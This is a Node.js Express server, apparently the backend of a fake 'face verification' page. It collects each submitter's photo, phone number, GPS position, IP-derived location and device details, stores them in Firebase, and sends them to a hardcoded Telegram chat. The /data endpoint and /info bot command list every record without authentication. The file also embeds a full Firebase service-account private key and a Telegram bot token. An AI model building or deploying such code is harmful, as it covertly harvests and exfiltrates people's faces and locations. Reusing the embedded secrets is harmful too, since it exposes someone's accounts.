const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');
const admin = require('firebase-admin');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== FIREBASE CONFIG =====
// Service account key (copy paste dari file JSON Anda)
const serviceAccount = {
  "type": "service_account",
  "project_id": "nampung",
  "private_key_id": "8eb3e9859f0769d3cd3df7ca8c490dbd675ff5c5",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCypES+KB2FkCcc\neMInRJwgwn+NHAzMHqf2nkfDs/YTEh5+3DzEwb/W4sqj0luOut44a4Zfe2sZVC2v\nxZHdYoYY9GOgs5B2wIaSVnthVEUJKAetDJHunjc9TF/EfKcDMMkaeMFnv1/XkNKX\nNonC0sQsh0JEAkHvPiMsju1cUjMyOJnpQtMDTSr2EkeXmurZkG1o7ydNlHQxgybN\nQblUGEynr5/hKoiCJfYGZokTXz1BDe9eeVixbKRAaykj3T/QFxkgC9Xr3VMj6SKa\namd8LwTWGBzj/5sauGYJK55rPNLpd4dCN+GpQC8Yx0qXXkO/ajEvxchtp+O8aYyH\nK+UuLJhfAgMBAAECggEAP99lJtqAB7ftjAwPW2v4KOxyH7mWR8t0QcUBItOvGc2C\nMti7L5yY45POYXm+u89L0j972Zruxa0n8q+BAneOO9Dx6E0by6H128/pKHkxf98c\ns36JlRhj5tpuaXoqWwUv+nOPr3EpKxHAgkmBQzQJ6WPpSRjHi2ubtvxZmQdY/8zM\no55xIV8WLQNdMW36c7gPewTRwEGAeHdcKmaMvSa/jVy++zn8e+aMota86rAvbhT/\nObsl2BBEijvGTjIpAOl2WhWkIMzS9TvzPDlkXyQ5PRz5n3m83g9LlOAcfWAv+ZU4\nSQlesF3QTiiwWMAO/00qSQkpJvZmQ57AEtAsn3YkpQKBgQDoViBQNgAdim2ZByt+\nCwkf6F4AzqQjxIwIWI8CWsO9BCQAZLgEvXp/H+is5X/Q8389nuTA7ZPaFi43/Xk1\n6yS3SmYu+HYBAjsjO1HI6k5vU4KVsD5SucMZEq4a0Q/jj4dSTizcTYymGvS4Y97n\n6pe17h0Zz7sJEySZkhhYpv7Q0wKBgQDE1h7b+UyOCK8phDEhycERBUOiczakMB1r\nqlkxnD0R83VgPdpX9dIr25cBskm+bFmta2kBuWmIq2w2yqubKy8ZtQwFw5dDKebY\nmiqOpXLInRHFJFjJbrdqGROkMnZscIjXZ7tLFZypaWarmNPv9Z4EyJrl7caEDvyC\nPOwBsRLCxQKBgE4bJiHRBZjowI+BaY2mCBtB8tgyn9umZ60mmG0iNkuE6NV5BqQR\nTu0NvRrizGVidpQwppZ1SA85BbCs9eK6ek1kJZYE0SblqRvfBU+V9WhXmr7X0Rve\nd0gmj4FUZxMJXWS+AzbMm0v8I+kZKgatRvNSaVYUD7ytQtCd3LFw8pkhAoGAHWBr\niJ8DWutW4RZWktlelCC6AGO7kvOPYIMy/qF3x9cS/IMetCP+8wa52cn3EZFwLN6r\n9FLsujYDV4YV6HmgdPC9U5rmV2LIjiksEtAEeoZeoZKUIbQBcbc+ZDIX1IVTFvrn\nTAR0tiAB77hGYTjCFaqu24QKLali7DkVbAc2apUCgYEA48Fb2EDxeZKYbPhzbOg1\n0rU0K+Z7BYli29lsLcFNs0MLFROcOCudL9AZQV7/f1BFPIyXk/jPyIhcSfO4zj7s\n3A5oEEww/JdNt/r7Ik2Qj4HV54AR11NHzLAnZh19sTTCyQWYQzgqM23DeHjsvEpF\nA0VDWADdYDVskl0t1GkX8/E=\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fbsvc@nampung.iam.gserviceaccount.com",
  "client_id": "105465652603290327209",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40nampung.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
};

// ===== INIT FIREBASE =====
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://nampung-default-rtdb.asia-southeast1.firebasedatabase.app/'
});

const database = admin.database();
const verifikasiRef = database.ref('verifikasi');

console.log('🔥 Firebase connected successfully!');

// ===== BOT CONFIG =====
const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = '7352381955';

console.log('========================================');
console.log('🚀 SERVER STARTING');
console.log('========================================');
console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
console.log('========================================');

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// ===== GET GPS LOCATION =====
async function getLocationDetails(ip) {
  try {
    const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
    if (!cleanIp) return null;
    
    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting`);
    const data = await res.json();
    
    if (data.status === 'success') {
      return {
        ip: data.query,
        country: data.country || '-',
        countryCode: data.countryCode || '-',
        region: data.regionName || '-',
        city: data.city || '-',
        zip: data.zip || '-',
        latitude: data.lat || 0,
        longitude: data.lon || 0,
        timezone: data.timezone || '-',
        isp: data.isp || '-',
        provider: data.isp ? data.isp.replace('PT ', '') : '-',
        isMobile: data.mobile || false,
        fullLocation: `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`,
        googleMapsLink: `https://www.google.com/maps?q=${data.lat || 0},${data.lon || 0}`
      };
    }
    return null;
  } catch (e) {
    console.error('Geolocation error:', e.message);
    return null;
  }
}

// ===== DETECT DEVICE =====
function detectDevice(userAgent) {
  if (!userAgent) return { browser: 'Tidak diketahui', os: 'Tidak diketahui', device: 'Tidak diketahui', brand: 'Tidak diketahui', model: 'Tidak diketahui' };
  
  const ua = userAgent.toLowerCase();
  const info = {
    browser: 'Tidak diketahui',
    os: 'Tidak diketahui',
    device: 'Tidak diketahui',
    brand: 'Tidak diketahui',
    model: 'Tidak diketahui'
  };

  // Browser
  if (ua.includes('chrome')) info.browser = 'Chrome';
  else if (ua.includes('firefox')) info.browser = 'Firefox';
  else if (ua.includes('safari') && !ua.includes('chrome')) info.browser = 'Safari';
  else if (ua.includes('edge')) info.browser = 'Edge';

  // OS
  if (ua.includes('android')) {
    info.os = 'Android';
    const match = ua.match(/android\s([\d.]+)/);
    if (match) info.os += ` ${match[1]}`;
  } else if (ua.includes('iphone') || ua.includes('ipad')) {
    info.os = 'iOS';
    const match = ua.match(/os\s([\d_]+)/);
    if (match) info.os += ` ${match[1].replace(/_/g, '.')}`;
  } else if (ua.includes('windows')) {
    info.os = 'Windows';
  } else if (ua.includes('mac')) {
    info.os = 'macOS';
  }

  // Device Type
  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
    info.device = 'Mobile';
  } else if (ua.includes('tablet') || ua.includes('ipad')) {
    info.device = 'Tablet';
  } else {
    info.device = 'Desktop';
  }

  // Brand
  const brands = [
    { name: 'Samsung', patterns: ['samsung', 'sm-'] },
    { name: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco'] },
    { name: 'Realme', patterns: ['realme'] },
    { name: 'Oppo', patterns: ['oppo'] },
    { name: 'Vivo', patterns: ['vivo'] },
    { name: 'OnePlus', patterns: ['oneplus'] },
    { name: 'Google Pixel', patterns: ['pixel'] },
    { name: 'Huawei', patterns: ['huawei', 'honor'] },
    { name: 'Apple', patterns: ['iphone', 'ipad'] }
  ];

  for (const brand of brands) {
    if (brand.patterns.some(p => ua.includes(p))) {
      info.brand = brand.name;
      break;
    }
  }

  // Model
  if (info.brand === 'Apple') {
    const match = ua.match(/iphone(\d+)/);
    if (match) info.model = `iPhone ${match[1]}`;
  } else if (info.brand === 'Samsung') {
    const match = ua.match(/sm-[a-z0-9]+/i);
    if (match) info.model = match[0].toUpperCase();
  }

  return info;
}

// ===== SEND TO TELEGRAM =====
async function sendToTelegram(photoBuffer, data) {
  try {
    const { device, gps, locationData, ip, timestamp, phone } = data;
    const time = new Date(timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    
    let caption = `🟡 *VERIFIKASI WAJAH*\n\n`;
    caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
    caption += `🕒 *Waktu:* ${time}\n\n`;
    
    // Device Info
    if (device) {
      caption += `📱 *Device Info:*\n`;
      caption += `   🏷️ Brand: ${device.brand || 'Tidak diketahui'}\n`;
      if (device.model && device.model !== 'Tidak diketahui') {
        caption += `   📟 Model: ${device.model}\n`;
      }
      caption += `   📱 Tipe: ${device.device || 'Tidak diketahui'}\n`;
      caption += `   💻 OS: ${device.os || 'Tidak diketahui'}\n`;
      caption += `   🌐 Browser: ${device.browser || 'Tidak diketahui'}\n\n`;
    }
    
    // Location
    if (locationData) {
      caption += `📍 *Lokasi:*\n`;
      caption += `   🏙️ ${locationData.fullLocation}\n`;
      caption += `   📮 Zip: ${locationData.zip}\n`;
      caption += `   🌐 Timezone: ${locationData.timezone}\n`;
      caption += `   📡 Provider: ${locationData.provider}\n\n`;
      
      caption += `🗺️ *Google Maps:*\n`;
      caption += `${locationData.googleMapsLink}\n\n`;
      
      caption += `📊 *Koordinat:*\n`;
      caption += `   ${locationData.latitude}, ${locationData.longitude}\n\n`;
    }
    
    // GPS
    if (gps) {
      caption += `📍 *GPS:*\n`;
      caption += `   ${gps.latitude}, ${gps.longitude}\n`;
      caption += `   🎯 Akurasi: ${gps.accuracy ? Math.round(gps.accuracy) + 'm' : 'Tidak diketahui'}\n\n`;
    }
    
    caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
    caption += `_Foto diterima untuk verifikasi_`;

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', caption);
    form.append('photo', photoBuffer, { 
      filename: `verifikasi_${Date.now()}.jpg`, 
      contentType: 'image/jpeg' 
    });

    const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form,
    });
    
    const tgData = await tgResponse.json();
    console.log('📨 Telegram response:', tgData.ok ? '✅ Success' : '❌ Failed');
    
    // Kirim lokasi
    if (gps) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          latitude: gps.latitude,
          longitude: gps.longitude
        })
      });
    }
    
    return tgData;
  } catch (err) {
    console.error('Send error:', err);
    return null;
  }
}

// ===== WEBHOOK BOT =====
app.post('/webhook', async (req, res) => {
  try {
    const { message } = req.body;
    console.log('📨 Webhook received');
    
    if (message && message.text === '/info') {
      const chatId = message.chat.id;
      
      // Ambil data dari Firebase
      const snapshot = await verifikasiRef.once('value');
      const allData = snapshot.val();
      
      if (!allData) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: '📭 Belum ada data verifikasi.'
          })
        });
        return res.sendStatus(200);
      }
      
      const users = Object.values(allData);
      let response = `📊 *DATA VERIFIKASI*\n\n`;
      response += `Total: ${users.length} orang\n\n`;
      
      users.forEach((user, index) => {
        const lastIndex = users.length - 1;
        response += `${index + 1}. 📱 ${user.phone || 'User'}\n`;
        response += `   🕒 ${user.timestamp || '-'}\n`;
        response += `   📍 ${user.location || 'Tidak diketahui'}\n`;
        response += `   📱 ${user.device || 'Tidak diketahui'}\n`;
        if (index < lastIndex) response += `\n`;
      });
      
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: response,
          parse_mode: 'Markdown'
        })
      });
    }
    
    res.sendStatus(200);
  } catch (err) {
    console.error('Webhook error:', err);
    res.sendStatus(500);
  }
});

// ===== VERIFY ENDPOINT =====
app.post('/verify', async (req, res) => {
  console.log('📸 ===== NEW VERIFICATION =====');
  console.log('📸 Time:', new Date().toISOString());
  
  try {
    const { image, device, gps, locationName, timestamp, phone } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || '';
    
    console.log(`🌐 IP: ${ip}`);
    console.log(`📱 GPS:`, gps ? `${gps.latitude}, ${gps.longitude}` : 'Tidak ada');
    
    if (!image) {
      return res.json({ success: false, error: 'No image' });
    }
    
    // Get location from IP
    const locationData = await getLocationDetails(ip);
    
    // Detect device from user agent
    const deviceData = detectDevice(userAgent);
    
    // Process image
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    console.log(`📸 Image size: ${buffer.length} bytes`);
    
    // Prepare data for Firebase
    const userData = {
      phone: phone || `User_${Date.now().toString().slice(-6)}`,
      timestamp: new Date(timestamp || Date.now()).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
      location: locationData ? locationData.fullLocation : 'Tidak diketahui',
      ip: ip,
      device: deviceData ? `${deviceData.brand} ${deviceData.model}`.trim() || deviceData.device : 'Tidak diketahui',
      latitude: gps ? gps.latitude : (locationData ? locationData.latitude : 0),
      longitude: gps ? gps.longitude : (locationData ? locationData.longitude : 0),
      provider: locationData ? locationData.provider : '-',
      os: deviceData ? deviceData.os : '-',
      browser: deviceData ? deviceData.browser : '-',
      gpsAccuracy: gps ? gps.accuracy : null,
      locationFromIP: locationData ? locationData.fullLocation : null
    };
    
    // SAVE TO FIREBASE
    console.log('💾 Saving to Firebase...');
    const newUserRef = verifikasiRef.push();
    await newUserRef.set(userData);
    console.log(`✅ Saved to Firebase with key: ${newUserRef.key}`);
    
    // SEND TO TELEGRAM
    const result = await sendToTelegram(buffer, {
      device: deviceData,
      gps: gps,
      locationData: locationData,
      ip: ip,
      timestamp: timestamp || new Date().toISOString(),
      phone: userData.phone
    });
    
    if (result && result.ok) {
      console.log('✅ Success!');
      res.json({ success: true, firebaseKey: newUserRef.key });
    } else {
      console.log('❌ Failed to send to Telegram');
      res.json({ success: false, error: 'Telegram error' });
    }
    
  } catch (err) {
    console.error('❌ Error:', err);
    res.json({ success: false, error: err.message });
  }
});

// ===== TEST ENDPOINTS =====
app.get('/test', async (req, res) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
    const data = await response.json();
    res.json(data);
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.get('/send', async (req, res) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: '✅ Bot is working!'
      })
    });
    const data = await response.json();
    res.json(data);
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.get('/data', async (req, res) => {
  try {
    const snapshot = await verifikasiRef.once('value');
    res.json(snapshot.val());
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('========================================');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log('========================================');
});
